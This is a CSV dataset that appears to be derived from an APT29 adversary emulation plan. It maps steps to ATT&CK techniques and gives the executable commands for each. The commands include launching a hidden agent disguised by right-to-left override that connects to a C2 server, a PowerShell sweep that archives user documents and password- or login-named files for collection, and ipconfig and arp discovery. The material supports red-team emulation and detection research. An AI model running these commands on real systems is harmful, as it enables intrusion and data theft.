org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::1,1,RTLO Start Sandcat,"id: 571845f6-b75c-4b9d-a666-a78f7827261f | name: RTLO Start Sandcat | description: Perform RTLO technique with SANDCAT | tactic: execution | technique: attack_id: T1036.002 | name: Masquerading: Right-to-Left Override | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf | procedure_group: procedure_execution | procedure_step: 1.A | platforms: windows: psh,pwsh: command: Sleep 3;
$bin = Get-ChildItem *cod*scr*;
$arguments = '-server ""#{server}"" -group ""rtlo_group""';
start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;

if ($?) {
  write-host ""Successfully completed RTLO execution. A new agent should appear"";
  exit 0;

} else {
  write-host ""Failure of RTLO execution."";
  exit 1;
}
 | payloads: cod.3aka3.scr | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Sleep 3;
$bin = Get-ChildItem *cod*scr*;
$arguments = '-server ""#{server}"" -group ""rtlo_group""';
start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;

if ($?) {
  write-host ""Successfully completed RTLO execution. A new agent should appear"";
  exit 0;

} else {
  write-host ""Failure of RTLO execution."";
  exit 1;
}
","[""T1036.002""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::2,2,Masquerading: Right-to-Left Override,attack_id: T1036.002 | name: Masquerading: Right-to-Left Override,"[""T1036.002""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::3,3,PowerShell,"id: a5daa530-c640-49bc-aa54-6808789a684a | name: PowerShell | description: Spawn powershell.exe from cmd.exe | tactic: execution | technique: attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell | cti_source: https://securelist.com/the-cozyduke-apt/69731/ | procedure_group: procedure_execution | procedure_step: 1.B | platforms: windows: cmd: command: powershell.exe;
if ($?) {
  write-host ""[*] PowerShell successfully spawned"";
  exit 0;
}
 | executors: name: command_prompt | command: powershell.exe;
if ($?) {
  write-host ""[*] PowerShell successfully spawned"";
  exit 0;
}
","[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::4,4,Command and Scripting Interpreter: PowerShell,attack_id: T1059.001 | name: Command and Scripting Interpreter: PowerShell,"[""T1059.001""]","[""T1059""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::5,5,Automated Collection,"id: 5692da31-3586-4e4f-8f07-5750070c730b | name: Automated Collection | description: Execute PowerShell from cmd.exe to collect and compress files of specific extensions. | tactic: collection | technique: attack_id: T1119 | name: Automated Collection | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_collection | procedure_step: 2.A.1 | platforms: windows: psh,pwsh: command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
 | executors: name: powershell | command: $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
","[""T1119""]","[""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::6,6,Automated Collection,attack_id: T1119 | name: Automated Collection,"[""T1119""]","[""T1119""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::7,7,System Network Configuration Discovery,"id: ee08a427-1e1d-4d8a-aeb1-978a7fcf9087 | name: System Network Configuration Discovery | description: The ipconfig utility is executed via cmd to enumerate local TCP/IP network configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.A.2 | platforms: windows: cmd: command: ipconfig /all
 | executors: name: command_prompt | command: ipconfig /all
","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::8,8,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::9,9,System Network Configuration Discovery,"id: 64f1fcb4-399d-4f3b-9a6b-13ec00e1c2ce | name: System Network Configuration Discovery | description: The arp utility is executed via cmd to enumerate local ARP configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 2.A.3 | platforms: windows: cmd: command: arp -a
 | executors: name: command_prompt | command: arp -a
","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::10,10,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
